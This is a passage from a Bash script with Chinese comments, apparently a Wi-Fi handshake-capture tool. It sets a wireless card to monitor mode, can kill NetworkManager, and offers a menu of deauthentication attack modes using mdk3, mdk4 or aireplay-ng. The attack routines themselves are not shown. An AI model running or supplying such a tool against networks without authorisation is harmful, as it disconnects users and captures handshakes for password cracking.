                if_chipest="$(lsusb|awk -v if_usb_id="${if_usb_id}" '{if ($6==if_usb_id) {print $0}}'|head -n 1|awk '{for (i=7;i<=NF;i++) printf("%s ", $i); print ""}')"
                #if_suport_band=
                echo -e "${i}., ${if_name}, driver: ${if_driver} chipest: ${if_chipest}" >> "${work_dir}/interface_list.txt"
                let i++
        done
        
        #du qu list from file
        clear
        echo -e "\033[36m--------------------------------------------------------------------\033[0m"
        echo -e "                             \033[36m网卡选择一个\033[0m                           "
        echo -e "\033[36m--------------------------------------------------------------------\033[0m"
        while IFS=, read -r if_num if_name if_chipest; do
                echo -e "\033[32m${if_num} ${if_name}\033[0m ${if_chipest}"
        done < "${work_dir}/interface_list.txt"
        echo -e "\033[36m--------------------------------------------------------------------\033[0m"
}

#######################################
# 网卡选择函数，同时开启监听
# Globals:
#   ${wlan_card}、
# Arguments:
#   none
# Outputs:
#   none
# Returns:
#   none
#######################################
function select_interface() {

        local inface_num card_check_status interface_status monitor_check check_kill if_down if_monitor if_up
        show_interface_list
        echo -e "\033[33mPlease select one interface.\033[0m"
        read -p "> " inface_num
        while true
        do
                if [ -z "${inface_num}" ] || [ "${inface_num}" == "" ]; then
                        echo -e "\033[31mInface_num can not be null\033[0m"
                        read -p "> " inface_num
                elif [ "${inface_num}" == "0" ]; then
                        echo -e "\033[31mInface_num can not be 0\033[0m"
                        read -p "> " inface_num
                elif [[ ! "${inface_num}" =~ ^[0-9]+$ ]]; then
                        echo -e "\033[31mInface_num must be a number type\033[0m"
                        read -p "> " inface_num
                elif [ "${inface_num}" -gt "$(cat "${work_dir}/interface_list.txt"|wc -l)" ]; then
                        echo -e "\033[31mInface_num must be less than the interface list total num\033[0m"
                        read -p "> " inface_num
                else
                        break
                fi
        done
        
        #=====================shu chu ni  de  xuan  zhe  jie  guo====================
        wlan_card="$(cat "${work_dir}/interface_list.txt"|awk -F "," "NR==${inface_num}"'{print $2}'|awk '{print $1}')"
        airmon-ng | grep "${wlan_card}" >/dev/null 2>&1
        card_check_status=$?
        if [ "${card_check_status}" -eq 0 ]; then
                echo -e "\033[35mYour selected interface is\033[0m \033[32m[${wlan_card}]\033[0m \033[35mbe suported\033[0m"
        else
                echo -e "\033[35mYour selected interface is\033[0m \033[32m[${wlan_card}]\033[0m \033[31mnot be suported\033[0m"
                exit 5
        fi
        ip a |grep "${wlan_card}" >/dev/null 2>&1
        interface_status=$?
        
        #pan duan wang ka  shi  fou  kai qi jian  ting
        if [ "${interface_status}" -eq 0 ];then
                echo -e "\033[33mChecking interface ${wlan_card} work mode monitor.....\033[0m"
                iwconfig "${wlan_card}"|grep "Mode:Monitor" >/dev/null 2>&1
                monitor_check=$?
                if [ "${monitor_check}" -ne 0 ]; then
                        echo -e "\033[31mCHECK FAILD\033[0m \033[35mStart interface to monintor mode...\033[0m"
                        if [ "${force_killing_network_manager}" -eq 1 ]; then
                                airmon-ng check kill >/dev/null 2>&1
                        else
                                true
                        fi
                        check_kill=$?
                        ip link set "${wlan_card}" down >/dev/null 2>&1
                        if_down=$?
                        iw dev "${wlan_card}" set type monitor >/dev/null 2>&1
                        if_monitor=$?
                        ip link set "${wlan_card}" up >/dev/null 2>&1
                        if_up=$?
                        if [ "${check_kill}" -eq 0 ] && [ "${if_down}" -eq 0 ] && [ "${if_monitor}" -eq 0 ] && [ "${if_up}" -eq 0 ]; then
                                echo -e "\033[32mSUCESS..\033[0m"
                        else
                                echo -e "\033[31mFALED..\033[0m"
                                exit 6
                        fi
                else
                        echo -e "\033[32mCHECK OK\033[0m \033[35mThis interface ${wlan_card} already in monitor mode, continue !\033[0m"
                fi
        else
                echo -e "\033[33mThere is no such device ${wlan_card}, please make sure that you plug in the device and work normally\033[0m"
                exit 7
        fi

        local you_zl
        echo -ne "\033[33m按[Enter]键继续....\033[0m"
        read you_zl
}

#######################################
# 主菜单，功能模块的入口
# Globals:
#   ${attack_command}、${attack_mode}
# Arguments:
#   none
# Outputs:
#   none
# Returns:
#   none
#######################################
function main_menu() {

        local you_zl
        clear
        echo -e "\033[35m当前网卡：\033[0m${wlan_card:-无}   \033[35m当前模式：\033[0m${attack_mode:-无}   \033[35m扫描频段：\033[0m${attack_band:-无}"
        echo -e "\033[36m--------------------------------------------------------------------\033[0m"
        echo -e "                             \033[36m模式选择菜单\033[0m                           "
        echo -e "\033[36m--------------------------------------------------------------------\033[0m"
        echo -e "\033[32m1. 重新选择一个网卡\033[0m"
        echo -e "--------"
        echo -e "\033[32m2. mdk3 邪恶抓包(2.4Ghz推荐)\033[0m"
        echo -e "\033[32m3. mdk4 邪恶抓包(5Ghz推荐)\033[0m"
        echo -e "\033[32m4. aireplay-ng 邪恶抓包(备选)\033[0m"
        echo -e "\033[36m--------------------------------------------------------------------\033[0m"
        read -p "Please select: " you_zl
        case "${you_zl}" in
                1)
                        select_interface
                        main_menu
                        ;;
                2)
                        attack_command="mdk3"
                        attack_mode="mdk3_deauth"
                        hack_menu
                        ;;
                3)
                        attack_command="mdk4"
                        attack_mode="mdk4_deauth"
                        hack_menu
                        ;;
                4)
                        attack_command="aireplay-ng"
                        attack_mode="aireplay-ng_deauth"
                        hack_menu
                        ;;
                *)
                        main_menu
                        ;;
        esac
}

#######################################
# 脚本的入口，程序执行的起点函数main
# Globals:
#   none
# Arguments:
#   "$@"
# Outputs:
#   none
# Returns:
#   none
#######################################
function main() {

        get_user_option_paramater "$@"
        print_app_info
        install_essensiel_tool
        if [ "${force_killing_network_manager}" -eq 1 ]; then
                kill_busy_process
        fi
        print_notice
        select_interface
        main_menu
}

#######################################
# 脚本退出的动画信息
# Globals:
#   none
# Arguments:
#   传入参数：为一串文字提示信息
# Outputs:
#   none
# Returns:
#   none
#######################################
function print_process_msg() {

        local message="$1"
        local cahr_1="${message}."
        local cahr_2="${message}.."
        local cahr_3="${message}..."
        local cahr_4="${message}...."
        local cahr_5="${message}....."
        local i=1
        local r_char msg
        while [[ "${i}" -le 5 ]]; do
                r_char="\$cahr_${i}"
                msg="$(eval "echo -e \"${r_char}\"")"
                echo -ne "\033[?25l${msg}\033[0m"
                echo -ne "\r\r"
                let i++
                sleep 0.3
        done
        echo -e "\033[?25l${msg} \033[32mOK\033[0m"
        echo -e "\033[?25h\033[0m"
        echo -e "\033[2A\033[0m"
}

#######################################
# 后代进程查杀函数
# Globals:
#   none
# Arguments:
#   none
# Outputs:
#   none
# Returns:
#   none
#######################################
function kill_son_process() {

        local parent_pid mom_pid child_pid mom_pid_sum iterm
        for parent_pid in "${scan_pid}" "${attack_pid}" "${handshake_pid}"
        do
                mom_pid="${parent_pid}"
                child_pid="$(get_treepid "${mom_pid}"|awk '{for(i = 1; i <= NF; i++) printf("%s%s", $i,"\n")}')"
                kill "${mom_pid}" >/dev/null 2>&1
                mom_pid_sum="$(ps -ef|awk "NR>1"'{print $2}'|egrep "^${mom_pid}$"|grep -v "grep"|wc -l)"
                while true
                do
                        if [ "${mom_pid_sum}" -gt 0 ]; then
                                mom_pid_sum="$(ps -ef|awk "NR>1"'{print $2}'|egrep "^${mom_pid}$"|grep -v "grep"|wc -l)"
                                sleep 1
                        else
                                for iterm in ${child_pid}
                                do
                                        kill "${iterm}" >/dev/null 2>&1
                                done
                                break
                        fi
                done
                sleep 0.5
        done
}

#######################################
# 网卡模式恢复函数
# Globals:
#   none
# Arguments:
#   none
# Outputs:
#   none
# Returns:
#   none
#######################################
function restore_interface_mode() {

        ip link set "${wlan_card}" down >/dev/null 2>&1
        iw dev "${wlan_card}" set type managed >/dev/null 2>&1
        ip link set "${wlan_card}" up >/dev/null 2>&1
}

#######################################
# 抓包成功后正常退出处理程序
# Globals:
#   none
# Arguments:
#   none
# Outputs:
#   none
# Returns:
#   none
#######################################
function hard_core_exit() {

        print_process_msg "清理进程"
        kill_son_process
        print_process_msg "恢复网卡接口模式"
        restore_interface_mode
        if [ "${force_killing_network_manager}" -eq 1 ]; then
                print_process_msg "恢复NetworkManager服务"
                systemctl restart NetworkManager >/dev/null 2>&1
        fi
        exit 0
}

#######################################
# 脚本的退出信号处理程序
# Globals:
#   none
# Arguments:
#   none
# Outputs:
#   none
# Returns:
#   none
#######################################
function exit_shell() {

        local you_zl
        echo
        echo -e "\033[31m\033[1mAre you sure want exit now? [y/n]:\033[0m "
        echo -n "> "
        read you_zl
        case "${you_zl}" in
                y)
                        print_process_msg "清理进程"
                        kill_son_process
                        print_process_msg "恢复网卡接口模式"
                        restore_interface_mode
                        if [ "${force_killing_network_manager}" -eq 1 ]; then
                                print_process_msg "恢复NetworkManager服务"
                                systemctl restart NetworkManager >/dev/null 2>&1
                        fi
                        exit 0
                        ;;
                n)
                        print_process_msg "清理进程"
                        kill_son_process
                        main_menu
                        ;;
                *)
                        exit_shell
                        ;;
        esac
}

# 捕获目标信号执行对应操作函数exit_shell
for i in HUP INT QUIT TSTP
do
        trap_cmd="trap \"exit_shell\" ${i}"
        eval "${trap_cmd}"
done

main "$@"
